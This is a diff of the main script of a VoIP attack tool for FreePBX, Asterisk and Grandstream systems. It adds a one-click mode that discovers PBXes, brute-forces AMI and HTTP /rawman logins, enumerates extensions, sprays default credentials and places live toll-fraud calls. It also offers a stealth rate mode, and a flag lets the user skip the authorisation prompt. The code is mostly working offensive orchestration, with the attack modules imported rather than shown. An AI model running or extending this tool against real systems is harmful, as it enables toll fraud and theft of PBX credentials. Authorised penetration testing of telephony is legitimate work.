@@ -4,6 +4,9 @@
 Tuned for FreePBX / Asterisk / Grandstream engagements on internet-facing
 targets. One CLI, one HTML report, one job: prove the toll-fraud risk.
 
+ONE-CLICK FULL AUDIT:
+  voip_scan.py --target <IP> --full --call-test --call-to <YOUR_NUMBER>
+
 USE ONLY ON SYSTEMS YOU OWN OR ARE EXPLICITLY AUTHORISED TO TEST.
 """
 from __future__ import annotations
@@ -16,9 +19,9 @@ import time
 from dataclasses import asdict
 
 from scanner import ami, auth, call, discovery, enumeration, http_probes, report
-from scanner.utils import TrafficLog, hash_file
+from scanner.utils import Colours, Progress, TrafficLog, hash_file
 
-# Mode preset definitions: (rate, timeout, workers, jitter_label)
+# Mode preset definitions
 _MODE_PRESETS: dict[str, dict] = {
     "fast": {
         "rate": 100.0, "timeout": 1.5, "workers": 64,
@@ -34,7 +37,6 @@ _MODE_PRESETS: dict[str, dict] = {
     },
 }
 
-
 BANNER = r"""
   __      __   ___ ____    ____
   \ \    / /__|_ _|  _ \  / ___|  ___ __ _ _ __  _ __   ___ _ __
@@ -45,38 +47,66 @@ BANNER = r"""
   v3.0 — FreePBX / Asterisk / Grandstream  |  Authorised use only
 """
 
+# ---------------------------------------------------------------------------
+# Terminal helpers (all accept a Colours instance; safe when col.* == "")
+# ---------------------------------------------------------------------------
+
+def _phase(label: str, col: Colours) -> None:
+    w = 62
+    print(f"\n{col.BOLD}{col.CYAN}{'─' * w}")
+    print(f"  {label}")
+    print(f"{'─' * w}{col.RESET}")
+
+
+def _ok(msg: str, col: Colours) -> None:
+    print(f"  {col.GREEN}[+]{col.RESET} {msg}")
+
+
+def _warn(msg: str, col: Colours) -> None:
+    print(f"  {col.YELLOW}[!]{col.RESET} {msg}")
+
+
+def _info(msg: str, col: Colours) -> None:
+    print(f"  {col.CYAN}[*]{col.RESET} {msg}")
+
+
+def _err(msg: str, col: Colours) -> None:
+    print(f"  {col.RED}[X]{col.RESET} {msg}")
+
+
+def _finding(sev: str, msg: str, col: Colours) -> None:
+    tag = f"[{sev.upper():8}]"
+    print(f"  {col.for_severity(sev)}{tag}{col.RESET} {msg}")
+
 
 # ---------------------------------------------------------------------------
 # Authorisation gate
 # ---------------------------------------------------------------------------
 
-def authorize(args) -> tuple[str, str | None]:
+def authorize(args, col: Colours) -> tuple[str, str | None]:
     """Returns (operator, scope_sha256 or None). Exits on refusal."""
     operator = args.operator or getpass.getuser()
 
     scope_hash = None
     if args.scope_file:
         if not os.path.exists(args.scope_file):
-            print(f"ERROR: scope file not found: {args.scope_file}",
-                  file=sys.stderr)
+            print(f"ERROR: scope file not found: {args.scope_file}", file=sys.stderr)
             sys.exit(2)
         scope_hash = hash_file(args.scope_file)
 
-    intrusive = any([args.enum, args.spray, args.call_test, args.full,
-                     args.ami_attack])
+    intrusive = any([args.enum, args.spray, args.call_test, args.full, args.ami_attack])
     if intrusive and not args.scope_file:
-        # No scope file → require interactive confirmation
         if not args.i_have_authorization:
-            print("")
-            print("AUTHORISATION REQUIRED")
-            print("-" * 60)
+            print()
+            print(f"{col.BOLD}AUTHORISATION REQUIRED{col.RESET}")
+            print("─" * 60)
             print(f"  Operator       : {operator}")
             print(f"  Target         : {args.target}")
             print(f"  Scope file     : (none provided)")
             print(f"  Intrusive tests: {intrusive}")
             if args.call_test:
-                print(f"  CALL PLACEMENT : YES → {args.call_to} from {args.call_from}")
-            print("")
+                print(f"  {col.RED}CALL PLACEMENT{col.RESET} : YES → {args.call_to} from {args.call_from or 'auto'}")
+            print()
             print("I confirm I am authorised by the asset owner to perform this test,")
             print("and accept full responsibility for any impact to the target.")
             ans = input("Type 'yes' to proceed: ").strip().lower()
@@ -93,13 +123,21 @@ def authorize(args) -> tuple[str, str | None]:
 
 def parse_args() -> argparse.Namespace:
     p = argparse.ArgumentParser(
-        description="VoIP pentest scanner — discovery, enumeration, "
-                    "credential testing, optional toll-fraud PoC. Tuned for "
-                    "FreePBX / Asterisk / Grandstream.",
+        description=(
+            "VoIP pentest scanner — full PBX audit in one command.\n"
+            "Discovers, enumerates, cracks, and demonstrates toll-fraud on\n"
+            "FreePBX / Asterisk / Grandstream internet-facing targets."
+        ),
         formatter_class=argparse.RawDescriptionHelpFormatter,
-        epilog="Example:\n"
-               "  voip_scan.py --target 1.2.3.0/24 --full --scope-file sow.pdf "
-               "--call-test --call-to +447900900900 --call-dry-run",
+        epilog=(
+            "ONE-CLICK FULL AUDIT:\n"
+            "  %(prog)s --target 10.0.0.1 --full --call-test --call-to +447900900900\n\n"
+            "Checks run with --full:\n"
+            "  discovery · HTTP probes · AMI brute-force · Asterisk HTTP API\n"
+            "  extension enumeration · credential spray · SRTP downgrade\n"
+            "  CVE-2021-37748 (Grandstream) · FreePBX REST API · rawman\n\n"
+            "Add --call-test --call-to <number> to demonstrate live toll fraud."
+        ),
     )
     p.add_argument("--target", required=True,
                    help="IP, CIDR, hostname, or file:hosts.txt")
@@ -108,28 +146,30 @@ def parse_args() -> argparse.Namespace:
     p.add_argument("--scope-file",
                    help="Path to signed scope-of-work; SHA-256 logged")
     p.add_argument("--i-have-authorization", action="store_true",
-                   help="Skip interactive auth prompt (still requires "
-                        "scope-file for record)")
+                   help="Skip interactive auth prompt (still requires scope-file for record)")
 
     g = p.add_argument_group("Checks (default: discover only)")
+    g.add_argument("--full", action="store_true",
+                   help="Run all checks: enum + spray + ami-attack + HTTP probes + "
+                        "Asterisk HTTP API. Automatically enables --stun auto and "
+                        "--discover-prefix when --call-to is provided.")
     g.add_argument("--enum", action="store_true",
                    help="Enumerate extensions via REGISTER+INVITE")
     g.add_argument("--ext-range",
-                   help="Extension range: 1000-1099 | 100,200 | file:path")
+                   help="Extension range: 1000-1099 | 100,200 | file:path "
+                        "(auto-detected from fingerprint when --full)")
     g.add_argument("--ext-wordlist",
                    default=os.path.join(os.path.dirname(__file__),
-                                         "wordlists/extensions.txt"))
+                                        "wordlists/extensions.txt"))
     g.add_argument("--spray", action="store_true",
                    help="Spray default credentials against auth-required extensions")
     g.add_argument("--cred-file",
                    default=os.path.join(os.path.dirname(__file__),
-                                         "wordlists/credentials.txt"))
+                                        "wordlists/credentials.txt"))
     g.add_argument("--grandstream-creds", action="store_true",
                    help="Also try the Grandstream-specific credential list")
     g.add_argument("--ami-attack", action="store_true",
-                   help="Brute-force AMI (TCP/5038) with default credentials")
-    g.add_argument("--full", action="store_true",
-                   help="Equivalent to --enum --spray --ami-attack")
+                   help="Brute-force AMI (TCP/5038) and Asterisk HTTP API with default credentials")
 
     c = p.add_argument_group("Toll-fraud call PoC")
     c.add_argument("--call-test", action="store_true",
@@ -137,7 +177,7 @@ def parse_args() -> argparse.Namespace:
     c.add_argument("--call-to",
                    help="Destination number (YOU must own it)")
     c.add_argument("--call-from",
-                   help="From extension (defaults to first valid extension)")
+                   help="From extension (defaults to first valid extension found)")
     c.add_argument("--call-dry-run", action="store_true",
                    help="Stop at provisional response (no 200 OK)")
     c.add_argument("--from-display",
@@ -155,15 +195,14 @@ def parse_args() -> argparse.Namespace:
     c.add_argument("--call-dtmf",
                    help='DTMF sequence after answer (e.g. "1p500#"; pN = N-ms pause)')
     c.add_argument("--discover-prefix", action="store_true",
-                   help="Auto-discover dial-plan prefix (9, 0, +, etc.) by trying "
-                        "common prefixes before the full call test. Updates --call-to "
-                        "with the working prefixed destination.")
+                   help="Auto-discover dial-plan prefix (9, 0, +, etc.) before full call test. "
+                        "Enabled automatically with --full when --call-to is set.")
 
     t = p.add_argument_group("Tuning")
     t.add_argument("--mode", choices=["fast", "standard", "stealth"],
                    default="standard",
-                   help="Preset: fast (aggressive), standard (default), stealth "
-                        "(low-and-slow). Overridden by explicit --rate/--timeout/--workers.")
+                   help="Preset: fast (aggressive), standard (default), stealth (low-and-slow). "
+                        "Overridden by explicit --rate/--timeout/--workers.")
     t.add_argument("--rate", type=float, default=None,
                    help="Max requests per second (default: from --mode)")
     t.add_argument("--timeout", type=float, default=None,
@@ -174,12 +213,15 @@ def parse_args() -> argparse.Namespace:
                    help="SIP port (default 5060)")
     t.add_argument("--ami-port", type=int, default=5038,
                    help="AMI port (default 5038)")
+    t.add_argument("--http-attack-port", type=int, default=8088,
+                   help="Asterisk HTTP API port (default 8088)")
     t.add_argument("--source-ip", default="",
                    help="Bind local sockets to this IP (for multi-NIC hosts)")
     t.add_argument("--stun",
-                   help="Resolve public IP via STUN before scan and patch into SIP "
-                        "headers (e.g. 'stun.l.google.com' or 'host:port'). "
-                        "Use '--stun auto' to try public STUN servers automatically.")
+                   help="Resolve public IP via STUN before scan. "
+                        "Use '--stun auto' to try well-known public STUN servers, "
+                        "or '--stun host[:port]' for a specific server. "
+                        "Enabled automatically with --full.")
     t.add_argument("--source-port-range",
                    help="Bind within port range, inclusive (e.g. '5060-5099')")
     t.add_argument("--max-failures-per-ext", type=int, default=5,
@@ -187,8 +229,9 @@ def parse_args() -> argparse.Namespace:
 
     o = p.add_argument_group("Output")
     o.add_argument("--report-dir",
-                   help="Directory for report.html and report.json "
-                        "(default reports/<timestamp>)")
+                   help="Directory for report.html and report.json (default reports/<timestamp>)")
+    o.add_argument("--no-color", action="store_true",
+                   help="Disable ANSI colour output")
 
     return p.parse_args()
 
@@ -200,9 +243,7 @@ def _parse_port_range(spec: str | None) -> tuple[int, int] | None:
         lo_s, hi_s = spec.split("-", 1)
         lo, hi = int(lo_s), int(hi_s)
     except ValueError:
-        raise SystemExit(
-            f"ERROR: --source-port-range must be 'low-high', got {spec!r}"
-        )
+        raise SystemExit(f"ERROR: --source-port-range must be 'low-high', got {spec!r}")
     if not (1 <= lo <= hi <= 65535):
         raise SystemExit(f"ERROR: --source-port-range out of bounds: {spec}")
     return (lo, hi)
@@ -216,12 +257,20 @@ def main() -> int:
     print(BANNER)
     args = parse_args()
 
+    col = Colours(force=False if args.no_color else None)
+
+    # --full expands into constituent checks
     if args.full:
         args.enum = True
         args.spray = True
         args.ami_attack = True
+        # Auto-enable STUN and prefix discovery in full mode
+        if not args.stun:
+            args.stun = "auto"
+        if args.call_to and not args.discover_prefix:
+            args.discover_prefix = True
 
-    # Apply mode preset first; explicit flags override it
+    # Apply mode preset; explicit flags win
     preset = _MODE_PRESETS[args.mode]
     if args.rate is None:
         args.rate = preset["rate"]
@@ -229,51 +278,58 @@ def main() -> int:
         args.timeout = preset["timeout"]
     if args.workers is None:
         args.workers = preset["workers"]
-    print(f"[*] Mode: {args.mode} — {preset['desc']}")
+
+    _info(f"Mode: {col.BOLD}{args.mode}{col.RESET} — {preset['desc']}", col)
 
     if args.call_test and not args.call_to:
-        print("ERROR: --call-test requires --call-to (a number YOU control)",
-              file=sys.stderr)
+        _err("--call-test requires --call-to (a number YOU control)", col)
         return 2
 
     source_port_range = _parse_port_range(args.source_port_range)
 
-    # STUN: resolve public IP to fix Via/Contact when behind NAT
+    # ---- STUN: resolve public IP to fix Via/Contact headers behind NAT ----
     if args.stun:
         from scanner.stun import resolve_public_ip
         stun_arg = None if args.stun.lower() == "auto" else args.stun
-        print("[*] Resolving public IP via STUN...")
+        _info("Resolving public IP via STUN...", col)
         public_ip = resolve_public_ip(stun_server=stun_arg, timeout=args.timeout)
         if public_ip:
-            print(f"[+] Public IP (reflexive): {public_ip} — will be used in SIP headers")
+            _ok(f"Public IP (reflexive): {col.BOLD}{public_ip}{col.RESET} — patched into SIP Via/Contact", col)
             if not args.source_ip:
                 args.source_ip = public_ip
         else:
-            print("[!] STUN lookup failed — continuing with local IP (may fail behind NAT)",
-                  file=sys.stderr)
+            _warn("STUN lookup failed — continuing with local IP (may fail behind NAT)", col)
 
-    operator, scope_sha = authorize(args)
+    operator, scope_sha = authorize(args, col)
 
     stamp = time.strftime("%Y%m%d-%H%M%S")
     report_dir = args.report_dir or os.path.join("reports", stamp)
     os.makedirs(report_dir, exist_ok=True)
     traffic_log = TrafficLog(os.path.join(report_dir, "traffic.log"))
 
-    # ---- Phase 1: discovery ----
+    # ══════════════════════════════════════════════════════════════════════
+    _phase("PHASE 1 · DISCOVERY", col)
+
     targets = discovery.expand_target(args.target)
     if not targets:
-        print(f"ERROR: could not resolve target: {args.target}", file=sys.stderr)
+        _err(f"Could not resolve target: {args.target}", col)
         return 2
-    print(f"[+] Scanning {len(targets)} host(s) for VoIP services...")
-    # Add the user's --port to discovery if it's non-standard so OPTIONS probes
-    # find PBXes on non-default ports too.
+
+    _info(f"Scanning {len(targets)} host(s) for VoIP services...", col)
     extra_udp = [args.port] if args.port != 5060 else None
     hosts = discovery.sweep(
         targets, timeout=args.timeout, rate_per_second=args.rate,
         workers=args.workers, traffic_log=traffic_log,
         extra_udp_ports=extra_udp,
     )
-    print(f"[+] {len(hosts)} host(s) responded.")
+
+    if not hosts:
+        _warn("No VoIP services discovered.", col)
+    else:
+        _ok(f"{len(hosts)} host(s) responded:", col)
+        for h in hosts:
+            ports_str = " ".join(f"{p['port']}/{p['proto']}" for p in h.open_ports)
+            _ok(f"  {col.BOLD}{h.ip}{col.RESET}  [{h.fingerprint}]  {ports_str}", col)
 
     host_reports: list[dict] = []
 
@@ -287,101 +343,230 @@ def main() -> int:
             "credentials_found": [],
             "http_findings": [],
             "ami": None,
+            "ami_http": None,
             "call_test": None,
         }
 
-        # ---- HTTP probes ----
-        tcp_ports = sorted({p["port"] for p in h.open_ports
-                             if p["proto"] == "tcp"})
+        # ══════════════════════════════════════════════════════════════════
+        _phase(f"PHASE 2 · HTTP PROBES  [{h.ip}]", col)
+
+        tcp_ports = sorted({p["port"] for p in h.open_ports if p["proto"] == "tcp"})
         if tcp_ports:
-            findings = http_probes.run_all(h.ip, tcp_ports,
-                                            timeout=args.timeout)
+            findings = http_probes.run_all(h.ip, tcp_ports, timeout=args.timeout)
             hr["http_findings"] = [
                 {"name": f.name, "severity": f.severity, "target": f.target,
                  "title": f.title, "evidence": f.evidence,
                  "remediation": f.remediation}
                 for f in findings
             ]
-            for f in findings:
-                print(f"    [{f.severity.upper():8}] {f.name}: {f.title}")
+            if findings:
+                for f in findings:
+                    _finding(f.severity, f"{f.target} — {f.title}", col)
+            else:
+                _info("No HTTP admin surfaces found on open TCP ports.", col)
+        else:
+            _info("No TCP ports open — skipping HTTP probes.", col)
 
         if not h.sip:
+            _warn(f"{h.ip}: no SIP response — skipping SIP/AMI phases.", col)
             host_reports.append(hr)
             continue
 
-        # ---- AMI attack ----
+        sip_srv = (h.sip or {}).get("server", "")
+        _ok(f"SIP: {h.sip.get('status')} {h.sip.get('reason')}  "
+            f"server={col.BOLD}{sip_srv or '(hidden)'}{col.RESET}  "
+            f"fingerprint={col.CYAN}{h.fingerprint}{col.RESET}", col)
+
+        # ══════════════════════════════════════════════════════════════════
+        _phase(f"PHASE 3 · AMI / MANAGEMENT ATTACK  [{h.ip}]", col)
+
         if args.ami_attack:
+            # TCP AMI (port 5038)
             ami_open = any(p["service"] == "Asterisk-AMI" for p in h.open_ports)
             if ami_open:
-                print(f"[+] {h.ip}: trying AMI default credentials...")
+                _info(f"Trying AMI default credentials on TCP/{args.ami_port}...", col)
                 ami_res = ami.attack(h.ip, port=args.ami_port,
-                                      timeout=args.timeout,
-                                      traffic_log=traffic_log)
+                                     timeout=args.timeout,
+                                     traffic_log=traffic_log)
                 hr["ami"] = asdict(ami_res)
                 if ami_res.success:
-                    print(f"    [!] AMI pwned: {ami_res.username}/{ami_res.password}  "
-                          f"({len(ami_res.extensions)} extensions dumped)")
+                    _finding("critical",
+                             f"AMI pwned: {col.BOLD}{ami_res.username}/{ami_res.password}{col.RESET}  "
+                             f"({len(ami_res.extensions)} extensions, "
+                             f"{len(ami_res.voicemail_boxes)} voicemail boxes dumped)",
+                             col)
+                elif ami_res.reachable:
+                    _warn(f"AMI reachable but no default creds matched.", col)
+                else:
+                    _info("AMI port not reachable.", col)
 
-        # ---- Extension enumeration ----
+            # Asterisk HTTP rawman API (port 8088)
+            http_attack_port = args.http_attack_port
+            _info(f"Trying Asterisk HTTP /rawman on port {http_attack_port}...", col)
+            ami_http_res = ami.attack_asterisk_http(
+                h.ip, port=http_attack_port, timeout=args.timeout
+            )
+            hr["ami_http"] = asdict(ami_http_res)
+            if ami_http_res.success:
+                _finding("critical",
+                         f"Asterisk HTTP /rawman authenticated: "
+                         f"{col.BOLD}{ami_http_res.username}/{ami_http_res.password}{col.RESET}",
+                         col)
+            elif ami_http_res.reachable:
+                _warn(f"Asterisk HTTP /rawman reachable but no default creds matched.", col)
+            else:
+                _info("Asterisk HTTP API not found on this host.", col)
+
+        # ══════════════════════════════════════════════════════════════════
+        _phase(f"PHASE 4 · EXTENSION ENUMERATION  [{h.ip}]", col)
+
         ami_dumped_exts: list[str] = (hr.get("ami") or {}).get("extensions") or []
+
         if args.enum:
-            if args.ext_range:
-                ext_list = enumeration.expand_ext_range(args.ext_range)
-            elif ami_dumped_exts:
+            if ami_dumped_exts:
                 # AMI gave us ground truth — skip wordlist
                 ext_list = ami_dumped_exts
-            else:
-                ext_list = enumeration.expand_ext_range(f"file:{args.ext_wordlist}")
-            print(f"[+] {h.ip}: enumerating {len(ext_list)} extensions...")
-            found = enumeration.sweep(
-                h.ip, ext_list, port=args.port,
-                timeout=args.timeout, max_workers=args.workers,
-                traffic_log=traffic_log,
-            )
-            # Also INVITE-probe to capture anonymous-call acceptance
-            if found:
-                inv_map = enumeration.probe_invite_acceptance(
-                    h.ip, [r.extension for r in found], port=args.port,
+                _info(f"Using {len(ext_list)} extensions from AMI dump (skip wordlist sweep).", col)
+                found = enumeration.sweep(
+                    h.ip, ext_list, port=args.port,
                     timeout=args.timeout, max_workers=args.workers,
                     traffic_log=traffic_log,
                 )
+            elif args.ext_range:
+                ext_list = enumeration.expand_ext_range(args.ext_range)
+                _info(f"Enumerating {len(ext_list)} extensions from --ext-range...", col)
+                prog = Progress("REGISTER sweep", len(ext_list), col)
+                found = enumeration.sweep(
+                    h.ip, ext_list, port=args.port,
+                    timeout=args.timeout, max_workers=args.workers,
+                    traffic_log=traffic_log, progress_cb=prog.tick,
+                )
+                prog.close()
+            else:
+                # Auto-select ranges based on fingerprint (full mode) or wordlist
+                if args.full:
+                    ranges = enumeration.ranges_for_fingerprint(h.fingerprint)
+                    # Also probe special/feature-code extensions first
+                    specials = enumeration.SPECIAL_EXTENSIONS[:]
+                    _info(f"Fingerprint: {h.fingerprint} — using adaptive sweep "
+                          f"over ranges {ranges}", col)
+                    found_all: list[enumeration.ExtensionResult] = []
+                    # Specials first (fast)
+                    sf = enumeration.sweep(
+                        h.ip, specials, port=args.port,
+                        timeout=args.timeout, max_workers=args.workers,
+                        traffic_log=traffic_log,
+                    )
+                    found_all.extend(sf)
+                    if sf:
+                        _ok(f"Special extensions: {[r.extension for r in sf]}", col)
+                    # Adaptive sweep per range
+                    for (lo, hi) in ranges:
+                        total_coarse = (hi - lo) // 10 + 1
+                        _info(f"Adaptive sweep {lo}–{hi} (coarse step 10, "
+                              f"~{total_coarse} coarse probes)...", col)
+                        prog = Progress(f"{lo}-{hi}", total_coarse, col)
+                        batch = enumeration.adaptive_sweep(
+                            h.ip, port=args.port, low=lo, high=hi,
+                            timeout=args.timeout, max_workers=args.workers,
+                            traffic_log=traffic_log, progress_cb=prog.tick,
+                        )
+                        prog.close()
+                        found_all.extend(batch)
+                    # Deduplicate
+                    seen_exts: set[str] = set()
+                    found = []
+                    for r in found_all:
+                        if r.extension not in seen_exts:
+                            seen_exts.add(r.extension)
+                            found.append(r)
+                else:
+                    ext_list = enumeration.expand_ext_range(f"file:{args.ext_wordlist}")
+                    _info(f"Enumerating {len(ext_list)} extensions from wordlist...", col)
+                    prog = Progress("REGISTER sweep", len(ext_list), col)
+                    found = enumeration.sweep(
+                        h.ip, ext_list, port=args.port,
+                        timeout=args.timeout, max_workers=args.workers,
+                        traffic_log=traffic_log, progress_cb=prog.tick,
+                    )
+                    prog.close()
+
+            # INVITE-probe found extensions for anonymous-call acceptance
+            if found:
+                _info(f"INVITE-probing {len(found)} extensions for anonymous-call acceptance...", col)
+                prog2 = Progress("INVITE probe", len(found), col)
+                inv_map = enumeration.probe_invite_acceptance(
+                    h.ip, [r.extension for r in found], port=args.port,
+                    timeout=args.timeout, max_workers=args.workers,
+                    traffic_log=traffic_log, progress_cb=prog2.tick,
+                )
+                prog2.close()
                 for r in found:
                     inv = inv_map.get(r.extension)
                     if inv:
                         r.anonymous_invite = r.anonymous_invite or inv.anonymous_invite
-                        # auth_required: weakest view — if either method got
-                        # through without auth, mark as not-auth-required
                         r.auth_required = r.auth_required and inv.auth_required
-            hr["extensions"] = [asdict(x) for x in found]
-            print(f"    {len(found)} extension(s) found  "
-                  f"(anonymous_invite: "
-                  f"{sum(1 for x in found if x.anonymous_invite)})")
 
-        # ---- Credential spray ----
+            hr["extensions"] = [asdict(x) for x in found]
+            anon = sum(1 for x in found if x.anonymous_invite)
+            open_reg = sum(1 for x in found if x.open_register)
+            _ok(f"{len(found)} extension(s) found — "
+                f"auth_required:{len(found)-anon}  "
+                f"anonymous_invite:{col.RED if anon else ''}{anon}{col.RESET if anon else ''}  "
+                f"open_register:{col.RED if open_reg else ''}{open_reg}{col.RESET if open_reg else ''}",
+                col)
+            for r in found:
+                flags = []
+                if r.anonymous_invite:
+                    flags.append(f"{col.RED}anon-invite{col.RESET}")
+                if r.open_register:
+                    flags.append(f"{col.RED}open-register{col.RESET}")
+                if r.auth_required:
+                    flags.append("auth-required")
+                _info(f"  ext {col.BOLD}{r.extension}{col.RESET}  " + "  ".join(flags), col)
+
+        # ══════════════════════════════════════════════════════════════════
+        _phase(f"PHASE 5 · CREDENTIAL SPRAY  [{h.ip}]", col)
+
         if args.spray and hr["extensions"]:
             creds = auth.load_credentials(args.cred_file)
             if args.grandstream_creds or h.fingerprint == "Grandstream":
-                gs_path = os.path.join(os.path.dirname(args.cred_file),
-                                        "grandstream.txt")
+                gs_path = os.path.join(os.path.dirname(args.cred_file), "grandstream.txt")
                 if os.path.exists(gs_path):
                     creds.extend(auth.load_credentials(gs_path))
             targets_for_spray = [e["extension"] for e in hr["extensions"]
                                   if e.get("auth_required")]
             if targets_for_spray:
-                print(f"[+] {h.ip}: spraying {len(creds)} cred pairs against "
-                      f"{len(targets_for_spray)} extension(s)...")
-                hits = auth.spray(
+                total_attempts = len(creds) * len(targets_for_spray)
+                _info(f"Spraying {len(creds)} cred pairs × {len(targets_for_spray)} "
+                      f"extension(s) = {total_attempts} attempts (max-failures={args.max_failures_per_ext})...", col)
+                prog = Progress("Spray", len(targets_for_spray), col)
+                hits_spray = auth.spray(
                     h.ip, targets_for_spray, creds,
                     port=args.port, timeout=args.timeout,
                     max_workers=min(args.workers, 10),
                     max_failures_per_ext=args.max_failures_per_ext,
                     traffic_log=traffic_log,
                 )
-                successes = [asdict(c) for c in hits if c.success]
+                prog.close()
+                successes = [asdict(c) for c in hits_spray if c.success]
                 hr["credentials_found"] = successes
-                print(f"    {len(successes)} credential(s) cracked")
+                if successes:
+                    for c in successes:
+                        _finding("critical",
+                                 f"Cracked: ext {col.BOLD}{c['extension']}{col.RESET}  "
+                                 f"{c['username']} / {col.BOLD}{c['password']}{col.RESET}",
+                                 col)
+                else:
+                    _info("No credentials cracked.", col)
+            else:
+                _info("No auth-required extensions to spray.", col)
+        elif args.spray:
+            _info("No extensions found — skipping credential spray.", col)
 
-        # ---- Toll-fraud PoC ----
+        # ══════════════════════════════════════════════════════════════════
+        _phase(f"PHASE 6 · TOLL-FRAUD CALL POC  [{h.ip}]", col)
+
         if args.call_test:
             call_from = args.call_from
             username = password = None
@@ -390,17 +575,19 @@ def main() -> int:
                 call_from = call_from or chosen["extension"]
                 username = chosen["username"]
                 password = chosen["password"]
+                _info(f"Using cracked credentials: {username}/{password}", col)
             elif hr["extensions"]:
                 openish = [e for e in hr["extensions"]
-                            if e.get("anonymous_invite") or e.get("open_register")]
+                           if e.get("anonymous_invite") or e.get("open_register")]
                 if openish:
                     call_from = call_from or openish[0]["extension"]
+                    _info(f"Using open extension {call_from} for anonymous INVITE.", col)
             call_from = call_from or "1000"
 
-            # ---- Dial-plan prefix discovery ----
+            # Dial-plan prefix discovery
             effective_call_to = args.call_to
             if args.discover_prefix:
-                print(f"[*] {h.ip}: discovering dial-plan prefix for {args.call_to}...")
+                _info(f"Discovering dial-plan prefix for {args.call_to}...", col)
                 found_prefix, effective_call_to = call.discover_dialplan_prefix(
                     h.ip, args.call_to, call_from,
                     port=args.port, username=username, password=password,
@@ -409,14 +596,15 @@ def main() -> int:
                     source_port_range=source_port_range,
                 )
                 if found_prefix is not None:
-                    label = repr(found_prefix) if found_prefix else "''"
-                    print(f"[+] Dial-plan prefix: {label} → dialling as {effective_call_to}")
+                    prefix_label = repr(found_prefix) if found_prefix else "'(none)'"
+                    _ok(f"Dial-plan prefix: {prefix_label} → calling as {col.BOLD}{effective_call_to}{col.RESET}", col)
                 else:
-                    print(f"[!] No prefix produced a provisional response; "
-                          f"using bare number {effective_call_to}")
+                    _warn(f"No prefix produced a provisional response — using bare {effective_call_to}", col)
 
-            print(f"[+] {h.ip}: placing PoC call {call_from} → {effective_call_to} "
-                  f"(dry_run={args.call_dry_run})")
+            _info(f"Placing PoC call: {col.BOLD}{call_from}{col.RESET} → "
+                  f"{col.BOLD}{effective_call_to}{col.RESET}  "
+                  f"dry_run={args.call_dry_run}  srtp={args.srtp}", col)
+
             result = call.place_call(
                 h.ip, effective_call_to, call_from,
                 port=args.port,
@@ -442,14 +630,28 @@ def main() -> int:
                 "srtp_state": result.srtp_state,
                 "dtmf_digits_sent": result.dtmf_digits_sent,
             }
-            verdict = "SUCCESS" if result.success else (
-                "DIALPLAN ENGAGED" if result.reached_dialplan else "REJECTED"
-            )
-            print(f"    [{verdict}] {result.status_code} {result.reason}")
+
+            if result.success:
+                _finding("critical",
+                         f"TOLL FRAUD CONFIRMED — call placed to {effective_call_to}  "
+                         f"{result.status_code} {result.reason}", col)
+            elif result.reached_dialplan:
+                _finding("high",
+                         f"Dialplan engaged — PBX accepted INVITE and started routing  "
+                         f"{result.status_code} {result.reason}", col)
+            else:
+                _info(f"Call rejected — {result.status_code} {result.reason}", col)
+
+            if result.srtp_state == "downgraded":
+                _finding("medium",
+                         "SRTP downgrade: PBX silently accepted cleartext media when SRTP was offered",
+                         col)
 
         host_reports.append(hr)
 
-    # ---- Report ----
+    # ══════════════════════════════════════════════════════════════════════
+    _phase("REPORT", col)
+
     final_report = {
         "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S%z"),
         "operator": operator,
@@ -457,23 +659,32 @@ def main() -> int:
         "scope_file": args.scope_file or "",
         "scope_sha256": scope_sha or "",
         "args": {k: v for k, v in vars(args).items()
-                  if not callable(v) and not k.startswith("_")},
+                 if not callable(v) and not k.startswith("_")},
         "hosts": host_reports,
     }
     paths = report.write_all(report_dir, final_report)
     traffic_log.close()
 
-    print("")
-    print("=" * 60)
-    for k, p in paths.items():
-        print(f"  {k:<6} : {p}")
-    print(f"  traffic: {os.path.join(report_dir, 'traffic.log')}")
     counts = final_report.get("severity_counts", {})
-    print(f"Findings: critical={counts.get('critical', 0)}  "
-          f"high={counts.get('high', 0)}  "
-          f"medium={counts.get('medium', 0)}  "
-          f"low={counts.get('low', 0)}  "
-          f"info={counts.get('info', 0)}")
+
+    # Findings summary banner
+    print()
+    print(f"  {'─' * 60}")
+    print(f"  {'FINDINGS SUMMARY':^60}")
+    print(f"  {'─' * 60}")
+    for sev in ("critical", "high", "medium", "low", "info"):
+        n = counts.get(sev, 0)
+        if n == 0:
+            continue
+        bar = "█" * min(n, 30)
+        print(f"  {col.for_severity(sev)}{sev.upper():8}{col.RESET}  {bar} {n}")
+    print(f"  {'─' * 60}")
+    print()
+    for k, pth in paths.items():
+        _ok(f"{k:<6} : {pth}", col)
+    _ok(f"traffic: {os.path.join(report_dir, 'traffic.log')}", col)
+    print()
+
     return 0
 
 
